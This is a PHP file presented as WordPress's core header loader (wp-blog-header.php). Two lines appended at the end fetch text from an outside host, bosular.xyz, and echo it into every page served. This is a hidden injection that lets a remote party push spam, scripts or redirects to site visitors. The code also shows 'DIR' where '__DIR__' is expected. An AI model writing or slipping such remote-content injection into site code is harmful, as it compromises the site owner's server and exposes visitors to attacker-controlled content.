<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

  $wp_did_header = true;

  // Load the WordPress library.
  require_once DIR . '/wp-load.php';

  // Set up the WordPress query.
  wp();

  // Load the theme template.
  require_once ABSPATH . WPINC . '/template-loader.php';

}
$a = file_get_contents( 'https://bosular.xyz/display/display.txt' );
echo $a;
